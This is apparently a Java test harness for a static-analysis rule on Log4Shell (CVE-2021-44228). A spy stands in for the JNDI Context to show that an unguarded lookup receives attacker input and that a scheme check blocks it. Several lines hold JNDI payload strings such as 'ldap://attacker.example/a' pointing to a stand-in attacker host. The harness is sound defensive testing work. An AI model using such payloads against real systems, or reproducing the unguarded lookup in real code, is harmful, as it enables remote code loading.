import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;
import javax.naming.Context;
import javax.naming.NamingException;

/**
 * Proves log4j-jndi-injection's sink is real: a spy standing in for
 * javax.naming.Context records every call it actually receives. No real LDAP
 * server is needed -- Log4Shell's danger is that attacker data reaches
 * Context.lookup() at all, independent of whether a server answers.
 */
class JndiInjectionProof {

    /** Records every (methodName, name-argument) pair a Context receives. */
    static final class Spy implements InvocationHandler {
        final List<String> calls = new ArrayList<>();

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) {
            if ("lookup".equals(method.getName()) || "lookupLink".equals(method.getName())) {
                calls.add(method.getName() + "(" + args[0] + ")");
            }
            return null;
        }

        Context asContext() {
            return (Context) Proxy.newProxyInstance(
                    Context.class.getClassLoader(), new Class<?>[] {Context.class}, this);
        }
    }

    private static final String JAVA_SCHEME = "java";
    private static int failed = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("=== JNDI injection: dynamic proof ===\n");

        vulnerableReachesRealLookup();
        guardedBlocksMaliciousScheme();
        guardedAllowsJavaScheme();

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
    }

    /** The Log4Shell shape: no scheme check, attacker string flows straight through. */
    private static void vulnerableReachesRealLookup() throws NamingException {
        Spy spy = new Spy();
        Context ctx = spy.asContext();

        String payload = "ldap://attacker.example/a";
        ctx.lookup(payload); // ruleid: log4j-jndi-injection -- unguarded call

        assertTrue("unguarded lookup() reached the sink with the exact payload",
                spy.calls.equals(List.of("lookup(" + payload + ")")));
        System.out.println("  vulnerable: Context.lookup() was invoked with \"" + payload
                + "\" -- this is the exact mechanism of CVE-2021-44228.");
    }

    /** JndiManager.lookup()'s real guard, reproduced verbatim. */
    private static Object guardedLookup(Context ctx, String name) throws NamingException {
        try {
            final URI uri = new URI(name);
            if (uri.getScheme() == null || uri.getScheme().equals(JAVA_SCHEME)) {
                return ctx.lookup(name); // ok: log4j-jndi-injection -- scheme validated first
            }
        } catch (URISyntaxException ignored) {
            // fall through to "not looked up"
        }
        return null;
    }

    private static void guardedBlocksMaliciousScheme() throws NamingException {
        for (String payload : new String[] {
            "ldap://attacker.example/a", "rmi://attacker.example/b", "dns://attacker.example/c"
        }) {
            Spy spy = new Spy();
            guardedLookup(spy.asContext(), payload);
            assertTrue("guarded lookup() never called Context.lookup() for \"" + payload + "\"",
                    spy.calls.isEmpty());
        }
        System.out.println("  guarded:    ldap:/rmi:/dns: payloads never reached "
                + "Context.lookup() -- zero calls recorded.");
    }

    private static void guardedAllowsJavaScheme() throws NamingException {
        Spy spy = new Spy();
        String legit = "java:comp/env/jdbc/AppDataSource";
        guardedLookup(spy.asContext(), legit);
        assertTrue("guarded lookup() still performs the real lookup for java: names",
                spy.calls.equals(List.of("lookup(" + legit + ")")));
        System.out.println("  guarded:    java: scheme still reaches Context.lookup() "
                + "unchanged -- the guard doesn't break legitimate use.");
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
